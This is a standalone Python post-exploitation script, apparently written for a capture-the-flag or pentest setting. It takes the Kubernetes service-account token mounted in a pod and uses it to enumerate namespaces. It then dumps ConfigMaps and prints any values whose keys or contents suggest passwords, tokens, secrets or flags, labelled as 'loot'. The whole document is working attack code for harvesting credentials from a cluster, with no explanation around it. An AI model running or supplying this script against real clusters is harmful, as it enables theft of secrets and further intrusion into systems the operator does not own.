python3 - <<'EOF'
import os, sys, json, ssl
from urllib.request import Request, urlopen

# === CONFIGURATION ===
SA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount"
TOKEN_PATH = os.path.join(SA_PATH, "token")
CACERT_PATH = os.path.join(SA_PATH, "ca.crt")
APISERVER = "https://kubernetes.default.svc"

# === VISUALS ===
class C:
    G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; R = "\033[91m"; E = "\033[0m"

# === SETUP ===
if not os.path.exists(TOKEN_PATH):
    print(f"{C.R}❌ FATAL: No Service Account found.{C.E}"); sys.exit(1)

with open(TOKEN_PATH) as f: TOKEN = f.read().strip()
SSL_CTX = ssl.create_default_context(cafile=CACERT_PATH)

def k8s_api(path):
    url = f"{APISERVER}{path}"
    req = Request(url, headers={"Authorization": f"Bearer {TOKEN}"})
    try:
        with urlopen(req, context=SSL_CTX, timeout=3) as res:
            return json.loads(res.read())
    except Exception: return None

# === 1. DISCOVER NAMESPACES ===
print(f"{C.B}=== 1. DISCOVERING NAMESPACES ==={C.E}")
namespaces = []

# Try API listing
resp = k8s_api("/api/v1/namespaces")
if resp and "items" in resp:
    namespaces = [item["metadata"]["name"] for item in resp["items"]]
    print(f"  ✅ Found {len(namespaces)} namespaces via API.")
else:
    print(f"  ❌ Cannot list namespaces API. Falling back to current.")
    try:
        with open(os.path.join(SA_PATH, "namespace")) as f:
            namespaces.append(f.read().strip())
    except: pass

print(f"  Targets: {C.C}{', '.join(namespaces)}{C.E}")

# === 2. LOOT CONFIGMAPS ===
print(f"\n{C.B}=== 2. CONFIGMAP DUMPER ==={C.E}")

for ns in namespaces:
    print(f"\n{C.C}📂 Namespace: {ns}{C.E}")
    
    # Try to list ConfigMaps in this namespace
    cm_resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
    
    if not cm_resp or "items" not in cm_resp:
        print(f"  ❌ Access Denied")
        continue

    count = len(cm_resp['items'])
    if count == 0:
        print(f"  (Empty)")
        continue

    print(f"  ✅ Found {count} ConfigMaps")
    
    for cm in cm_resp['items']:
        name = cm['metadata']['name']
        if name == "kube-root-ca.crt": continue # Skip noise
        
        print(f"    📄 {C.Y}{name}{C.E}")
        
        if "data" in cm:
            for key, val in cm["data"].items():
                # Heuristic: Check for secrets
                is_sus = any(x in val.lower() or x in key.lower() for x in ["flag", "pass", "key", "secret", "user", "admin", "token"])
                
                if is_sus:
                    print(f"      🚨 {C.G}POSSIBLE LOOT ({key}):{C.E}")
                    print(f"      {val}")
                else:
                    preview = val[:80].replace('\n', ' ')
                    if len(val) > 80: preview += "..."
                    print(f"      {key}: {preview}")
        else:
            print("      (No data)")

print(f"\n{C.G}Done.{C.E}")
EOF
